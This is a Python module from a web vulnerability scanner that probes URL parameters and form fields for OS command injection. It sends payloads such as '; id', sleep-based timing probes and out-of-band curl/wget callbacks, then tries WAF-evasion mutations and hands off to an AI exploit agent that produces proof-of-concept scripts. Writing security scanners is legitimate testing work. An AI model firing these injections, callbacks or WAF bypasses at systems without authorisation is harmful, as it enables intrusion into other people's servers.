"""
cyberm4fia-scanner - Command Injection Module
OS Command Injection detection (Threaded)
"""

import time
import re
from utils.colors import log_info, log_success, log_vuln
from utils.request import (
    get_oob_client,
    get_thread_count,
    increment_vulnerability_count,
    smart_request,
)
from modules.payloads import CMDI_PAYLOADS, CMDI_SIGNATURES
from utils.payload_filter import PayloadFilter
from modules.smart_payload import probe_cmdi_context
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from utils.request import ScanExceptions

def _match_standalone_output_line(text, candidates):
    """Return matched token only when it appears as a clean output line."""
    normalized = {c.lower() for c in candidates}
    for line in text.splitlines():
        cleaned = re.sub(r"\s+", " ", line.strip().lower())
        if not cleaned or "<" in cleaned or ">" in cleaned:
            continue
        if cleaned in normalized:
            return cleaned
    return None

def detect_cmdi(text):
    """Check response for high-confidence command execution indicators."""
    text_lower = text.lower()

    # Strong indicators first.
    for sig in CMDI_SIGNATURES.get("linux_id", []):
        if sig.lower() in text_lower:
            return "linux_id", sig

    for sig in CMDI_SIGNATURES.get("windows_dir", []):
        if sig.lower() in text_lower:
            return "windows_dir", sig

    # "whoami" style outputs are noisy; only accept exact standalone lines.
    linux_user = _match_standalone_output_line(
        text, CMDI_SIGNATURES.get("linux_whoami", [])
    )
    if linux_user:
        return "linux_whoami", linux_user

    windows_user = _match_standalone_output_line(
        text, CMDI_SIGNATURES.get("windows_whoami", [])
    )
    if windows_user:
        return "windows_whoami", windows_user

    return None, None

import functools
from utils.concurrency import run_concurrent_tasks

def _test_cmdi_param_payload(payload, param, params, parsed, delay, smart):
    if "sleep" in payload.lower():
        return None
    test_params = params.copy()
    test_params[param] = [payload]
    test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
    try:
        resp = smart_request("get", test_url, delay=delay)
        cmd_type, sig = detect_cmdi(resp.text)
        if cmd_type:
            increment_vulnerability_count()
            source = "🧠 Smart" if payload in smart else "📋 Static"
            log_vuln(f"COMMAND INJECTION FOUND! [{source}]")
            log_success(f"Param: {param} | Type: {cmd_type} | Output: {sig}")
            log_success(f"Payload: {payload}")
            return {
                "type": "CMDi_Param",
                "param": param,
                "payload": payload,
                "cmd_type": cmd_type,
                "url": test_url,
            }
    except ScanExceptions:
        pass
    return None

def _test_cmdi_form_payload(payload, inp, inputs, hidden_data, method, target, delay, smart):
    if "sleep" in payload.lower():
        return None
    data = {n: "127.0.0.1" for n in inputs}
    if hidden_data:
        data.update(hidden_data)
    data[inp] = payload
    try:
        resp = smart_request(
            method,
            target,
            data=data if method == "post" else None,
            params=data if method != "post" else None,
            delay=delay,
        )
        cmd_type, sig = detect_cmdi(resp.text)
        if cmd_type:
            increment_vulnerability_count()
            source = "🧠 Smart" if payload in smart else "📋 Static"
            log_vuln(f"COMMAND INJECTION FOUND! [{source}]")
            log_success(f"Form field: {inp} | Type: {cmd_type}")
            log_success(f"Payload: {payload}")
            return {
                "type": "CMDi_Form",
                "field": inp,
                "payload": payload,
                "cmd_type": cmd_type,
                "url": target,
                "method": method,
                "hidden_data": hidden_data,
            }
    except ScanExceptions:
        pass
    return None


def _test_blind_cmdi_sequential(url, forms, delay, target_context=None):
    """Test blind CMDi (time-based) - runs sequentially for accurate timing"""
    vulns = []
    sleep_payloads = [p for p in CMDI_PAYLOADS if "sleep" in p.lower()]
    if target_context:
        sleep_payloads = PayloadFilter.filter_payloads(sleep_payloads, target_context)

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    # Params
    for param in params.keys():
        for payload in sleep_payloads:
            test_params = params.copy()
            test_params[param] = [payload]
            test_url = urlunparse(
                parsed._replace(query=urlencode(test_params, doseq=True))
            )
            try:
                start = time.time()
                smart_request("get", test_url, delay=delay)
                elapsed = time.time() - start
                if elapsed > 4.5:
                    # Baseline Verification to prevent False Positives
                    start_base = time.time()
                    base_params = params.copy()
                    base_params[param] = ["cybm4f1a_test"]
                    base_url = urlunparse(
                        parsed._replace(query=urlencode(base_params, doseq=True))
                    )
                    smart_request("get", base_url, delay=delay)
                    base_elapsed = time.time() - start_base

                    if base_elapsed < 2.0:
                        increment_vulnerability_count()
                        log_vuln("BLIND COMMAND INJECTION FOUND!")
                        log_success(
                            f"Param: {param} | Delay: {elapsed:.2f}s (Baseline: {base_elapsed:.2f}s)"
                        )
                        vulns.append(
                            {
                                "type": "Blind_CMDi_Param",
                                "param": param,
                                "payload": payload,
                                "delay": elapsed,
                                "url": test_url,
                            }
                        )
                        break
                    else:
                        log_info(
                            f"Ignored false positive on {param} (Network delay detected: {base_elapsed:.2f}s)"
                        )
            except ScanExceptions:
                pass

    # Forms
    flattened_forms = []
    for f in forms:
        if isinstance(f, list):
            flattened_forms.extend(f)
        else:
            flattened_forms.append(f)

    for form in flattened_forms:
        if hasattr(form, "find_all"):
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            target = urljoin(url, action)
            all_inputs = form.find_all(["input", "textarea"])
            inputs = [
                i.get("name")
                for i in all_inputs
                if i.get("name")
                and i.get("type", "text") not in ["submit", "hidden", "button", "image"]
            ]
            hidden_data = {
                i.get("name"): i.get("value", "")
                for i in all_inputs
                if i.get("type") == "hidden" and i.get("name")
            }
        else:
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            target = urljoin(url, action)
            raw_inputs = form.get("inputs", [])
            inputs = []
            hidden_data = {}
            for i in raw_inputs:
                if isinstance(i, dict):
                    n = i.get("name")
                    t = i.get("type", "text")
                    if n:
                        if t == "hidden":
                            hidden_data[n] = i.get("value", "")
                        elif t not in ["submit", "hidden", "button", "image"]:
                            inputs.append(n)
            if not inputs and raw_inputs and isinstance(raw_inputs[0], str):
                inputs = raw_inputs

        for inp in inputs:
            for payload in sleep_payloads:
                data = {n: "127.0.0.1" for n in inputs}
                if hidden_data:
                    data.update(hidden_data)
                data[inp] = payload
                try:
                    start = time.time()
                    smart_request(
                        method,
                        target,
                        data=data if method == "post" else None,
                        params=data if method != "post" else None,
                        delay=delay,
                    )
                    elapsed = time.time() - start
                    if elapsed > 4.5:
                        # Baseline Verification
                        base_data = {n: "cybm4f1a_test" for n in inputs}
                        if hidden_data:
                            base_data.update(hidden_data)

                        start_base = time.time()
                        smart_request(
                            method,
                            target,
                            data=base_data if method == "post" else None,
                            params=base_data if method != "post" else None,
                            delay=delay,
                        )
                        base_elapsed = time.time() - start_base

                        if base_elapsed < 2.0:
                            increment_vulnerability_count()
                            log_vuln("BLIND COMMAND INJECTION FOUND!")
                            log_success(
                                f"Form field: {inp} | Delay: {elapsed:.2f}s (Baseline: {base_elapsed:.2f}s)"
                            )
                            vulns.append(
                                {
                                    "type": "Blind_CMDi_Form",
                                    "field": inp,
                                    "payload": payload,
                                    "delay": elapsed,
                                    "url": target,
                                    "method": method,
                                    "hidden_data": hidden_data,
                                }
                            )
                            break
                        else:
                            log_info(
                                f"Ignored false positive on {inp} (Network delay detected: {base_elapsed:.2f}s)"
                            )
                except ScanExceptions:
                    pass

    return vulns

def scan_cmdi(url, forms, delay, options=None, threads=None):
    from utils.tamper import get_tamper_chain

    if threads is None:
        threads = get_thread_count()
        
    options = options or {}
    target_context = options.get("target_context")

    chain = get_tamper_chain()
    payloads = list(CMDI_PAYLOADS)
    if chain.active:
        payloads = chain.apply_list(payloads)

    log_info(f"Testing Command Injection with {len(payloads)} payloads ({threads} threads)...")
    vulns = []
    tasks = []

    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    for param in params.keys():
        flat_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        probe = probe_cmdi_context(urlunparse(parsed), param, flat_params, method="get", delay=delay)
        smart = probe.get("smart_payloads", [])
        all_payloads = smart + [p for p in payloads if p not in smart] if smart else payloads
        if target_context:
            all_payloads = PayloadFilter.filter_payloads(all_payloads, target_context)
            
        oob_client = get_oob_client()
        if oob_client and oob_client.ready:
            oob_url = oob_client.generate_payload("cmdi", param)
            all_payloads.extend([f"; curl '{oob_url}' ;", f"| wget -qO- '{oob_url}' |"])
            
        for payload in all_payloads:
            tasks.append(functools.partial(_test_cmdi_param_payload, payload, param, params, parsed, delay, smart))

    flattened_forms = []
    for f in forms:
        if isinstance(f, list):
            flattened_forms.extend(f)
        else:
            flattened_forms.append(f)

    for form in flattened_forms:
        if hasattr(form, "find_all"):
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            target = urljoin(url, action)
            all_inputs = form.find_all(["input", "textarea"])
            inputs = [i.get("name") for i in all_inputs if i.get("name") and i.get("type", "text") not in ["submit", "hidden", "button", "image"]]
            hidden_data = {i.get("name"): i.get("value", "") for i in all_inputs if i.get("type") == "hidden" and i.get("name")}
            submit_btn = form.find("input", {"type": "submit"})
            if submit_btn and submit_btn.get("name"):
                hidden_data[submit_btn.get("name")] = submit_btn.get("value", "Submit")
        else:
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            target = urljoin(url, action)
            raw_inputs = form.get("inputs", [])
            inputs = []
            hidden_data = {}
            for i in raw_inputs:
                if isinstance(i, dict):
                    n = i.get("name")
                    t = i.get("type", "text")
                    if n:
                        if t == "hidden" or t == "submit":
                            hidden_data[n] = i.get("value", "Submit" if t == "submit" else "")
                        elif t not in ["button", "image"]:
                            inputs.append(n)
            if not inputs and raw_inputs and isinstance(raw_inputs[0], str):
                inputs = raw_inputs

        for inp in inputs:
            form_data = {n: "127.0.0.1" for n in inputs}
            if hidden_data: form_data.update(hidden_data)
            probe = probe_cmdi_context(target, inp, {}, method=method, form_data=form_data, delay=delay)
            smart = probe.get("smart_payloads", [])
            all_payloads = smart + [p for p in payloads if p not in smart] if smart else payloads
            if target_context:
                all_payloads = PayloadFilter.filter_payloads(all_payloads, target_context)
                
            oob_client = get_oob_client()
            if oob_client and oob_client.ready:
                oob_url = oob_client.generate_payload("cmdi", inp)
                all_payloads.extend([f"; curl '{oob_url}' ;", f"| wget -qO- '{oob_url}' |"])
                
            for payload in all_payloads:
                tasks.append(functools.partial(_test_cmdi_form_payload, payload, inp, inputs, hidden_data, method, target, delay, smart))

    vulns.extend(run_concurrent_tasks(tasks, max_workers=threads))

    blind_vulns = _test_blind_cmdi_sequential(url, forms, delay, target_context)
    vulns.extend(blind_vulns)

    # ── 3-tier WAF bypass chain (auto-tamper / AI evolution / protocol evasion) ──
    # Conservative fallback before delegating to ai_exploit_agent: only fires
    # when the main scan triggered a specific-WAF fingerprint, so request
    # budget stays bounded on non-WAF targets.
    if not vulns and params:
        bypass_finding = _run_waf_bypass_chain_for_cmdi(params, parsed, delay)
        if bypass_finding:
            vulns.append(bypass_finding)

    if not vulns and params:
        try:
            from utils.ai_exploit_agent import get_exploit_agent, ExploitContext
            agent = get_exploit_agent()
            if agent and agent.available:
                from utils.waf import waf_detector
                waf_name = getattr(waf_detector, "detected_waf", "") or ""

                for param in params:
                    ctx = ExploitContext(url=url, param=param, vuln_type="CMDi", waf=waf_name, http_method="GET")
                    result = agent.exploit_cmdi(ctx)
                    if result and result.success:
                        increment_vulnerability_count()
                        log_vuln(f"CMDi in: {param} [🤖 AI Agent Gen-{result.iteration}]")
                        vulns.append({
                            "type": "CMDi_Param",
                            "param": param,
                            "payload": result.payload,
                            "url": url,
                            "source": f"🤖 AI Agent (confidence: {result.confidence:.0f}%)",
                            "evidence": result.evidence[:200],
                            "ai_curl": result.curl_command,
                            "ai_poc_script": result.python_script,
                        })
                        break
        except ImportError:
            pass

    return vulns


def _run_waf_bypass_chain_for_cmdi(params, parsed, delay):
    """3-tier WAF bypass over each URL param using a representative cmdi
    payload. Returns the first finding or None.

    Activates only when ``waf_detector.detected_waf`` is non-empty, mirroring
    the conservative gate used in xss/sqli/ssti so we never spend AI tokens
    or extra requests on targets where no WAF was actually fingerprinted.
    """
    from utils.waf import waf_detector

    waf_name = getattr(waf_detector, "detected_waf", "") or ""
    if not waf_name:
        return None

    from utils.waf_evasion import apply_waf_bypass_chain

    seed_payload = "; id"

    log_info(f"⚡ CMDi: 3-tier WAF bypass attempt against {waf_name}")

    for param in list(params.keys()):
        # Per-param closure state so check_fn can reconstruct the test_url
        # that was actually sent (each tier mutates the payload).
        state = {"params": params.copy()}

        def request_fn(p, *, evasion_level=0):
            test_params = state["params"]
            test_params[param] = [p]
            test_url = urlunparse(
                parsed._replace(query=urlencode(test_params, doseq=True))
            )
            state["last_test_url"] = test_url
            try:
                return smart_request(
                    "get", test_url, delay=delay, evasion_level=evasion_level
                )
            except ScanExceptions:
                return None

        def check_fn(response, p, source):
            if response is None:
                return None
            cmd_type, sig = detect_cmdi(getattr(response, "text", "") or "")
            if not cmd_type:
                return None
            test_url = state.get("last_test_url", "")
            increment_vulnerability_count()
            log_vuln(f"COMMAND INJECTION via WAF bypass! [{source}]")
            log_success(f"Param: {param} | Type: {cmd_type} | {source}")
            return {
                "type": "CMDi_Param",
                "param": param,
                "payload": p,
                "cmd_type": cmd_type,
                "url": test_url,
                "source": f"WAF Bypass Chain ({source})",
                "waf": waf_name,
                "evidence": (sig or "")[:200],
            }

        seed_resp = request_fn(seed_payload)
        if seed_resp is None:
            continue

        finding = apply_waf_bypass_chain(
            payload=seed_payload,
            blocked_response=seed_resp,
            request_fn=request_fn,
            check_fn=check_fn,
            waf_name=waf_name,
            vuln_label="Command Injection",
        )
        if finding:
            return finding
    return None


# ── Async version ─────────────────────────────────────────────────────────

async def async_scan_cmdi(url, forms, delay, options=None):
    """Async version of scan_cmdi — uses asyncio.gather instead of ThreadPoolExecutor."""
    import asyncio
    from utils.async_request import async_smart_request, get_async_client

    options = options or {}
    target_context = options.get("target_context")

    payloads = list(CMDI_PAYLOADS)
    if target_context:
        payloads = PayloadFilter.filter_payloads(payloads, target_context)

    log_info(f"Testing Command Injection (async) with {len(payloads)} payloads...")
    vulns = []

    async with get_async_client() as client:

        async def _test_param(param, params, parsed):
            error_payloads = [p for p in payloads if "sleep" not in p.lower()]
            for payload in error_payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
                try:
                    resp = await async_smart_request(client, "get", test_url, delay=delay)
                    cmd_type, sig = detect_cmdi(resp.text)
                    if cmd_type:
                        increment_vulnerability_count()
                        log_vuln("COMMAND INJECTION FOUND!")
                        log_success(f"Param: {param} | Type: {cmd_type} | Output: {sig}")
                        return {"type": "CMDi_Param", "param": param, "payload": payload,
                                "cmd_type": cmd_type, "url": test_url}
                except ScanExceptions:
                    pass
            return None

        async def _test_form(inp, inputs, hidden_data, method, target):
            error_payloads = [p for p in payloads if "sleep" not in p.lower()]
            for payload in error_payloads:
                data = {n: "127.0.0.1" for n in inputs}
                if hidden_data:
                    data.update(hidden_data)
                data[inp] = payload
                try:
                    resp = await async_smart_request(
                        client, method, target,
                        data=data if method == "post" else None,
                        params=data if method != "post" else None,
                        delay=delay,
                    )
                    cmd_type, sig = detect_cmdi(resp.text)
                    if cmd_type:
                        increment_vulnerability_count()
                        log_vuln("COMMAND INJECTION FOUND!")
                        return {"type": "CMDi_Form", "field": inp, "payload": payload,
                                "cmd_type": cmd_type, "url": target, "method": method}
                except ScanExceptions:
                    pass
            return None

        async def _test_blind_param(param, params, parsed):
            sleep_payloads = [p for p in payloads if "sleep" in p.lower()]
            for payload in sleep_payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
                try:
                    start = time.time()
                    await async_smart_request(client, "get", test_url, delay=delay)
                    elapsed = time.time() - start
                    if elapsed > 4.5:
                        base_params = params.copy()
                        base_params[param] = ["cybm4f1a_test"]
                        base_url = urlunparse(parsed._replace(query=urlencode(base_params, doseq=True)))
                        start_base = time.time()
                        await async_smart_request(client, "get", base_url, delay=delay)
                        base_elapsed = time.time() - start_base
                        if base_elapsed < 2.0:
                            increment_vulnerability_count()
                            log_vuln("BLIND COMMAND INJECTION FOUND!")
                            return {"type": "Blind_CMDi_Param", "param": param,
                                    "payload": payload, "delay": elapsed, "url": test_url}
                except ScanExceptions:
                    pass
            return None

        tasks = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # Error-based (parallel)
        for param in params.keys():
            tasks.append(_test_param(param, params, parsed))

        flattened_forms = []
        for f in forms:
            if isinstance(f, list):
                flattened_forms.extend(f)
            else:
                flattened_forms.append(f)

        for form in flattened_forms:
            if hasattr(form, "find_all"):
                action = form.get("action") or url
                method = form.get("method", "get").lower()
                target = urljoin(url, action)
                all_inputs = form.find_all(["input", "textarea"])
                inputs = [i.get("name") for i in all_inputs if i.get("name")
                          and i.get("type", "text") not in ["submit", "hidden", "button", "image"]]
                hidden_data = {
                    i.get("name"): i.get("value", "")
                    for i in all_inputs if i.get("type") == "hidden" and i.get("name")
                }
            else:
                action = form.get("action") or url
                method = form.get("method", "get").lower()
                target = urljoin(url, action)
                raw_inputs = form.get("inputs", [])
                inputs = []
                hidden_data = {}
                for i in raw_inputs:
                    if isinstance(i, dict):
                        n = i.get("name")
                        t = i.get("type", "text")
                        if n:
                            if t == "hidden":
                                hidden_data[n] = i.get("value", "")
                            elif t not in ["submit", "hidden", "button", "image"]:
                                inputs.append(n)
                if not inputs and raw_inputs and isinstance(raw_inputs[0], str):
                    inputs = raw_inputs
            for inp in inputs:
                tasks.append(_test_form(inp, inputs, hidden_data, method, target))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, dict):
                vulns.append(result)

        # Blind CMDi (sequential for timing accuracy)
        for param in params.keys():
            result = await _test_blind_param(param, params, parsed)
            if result:
                vulns.append(result)

    return vulns
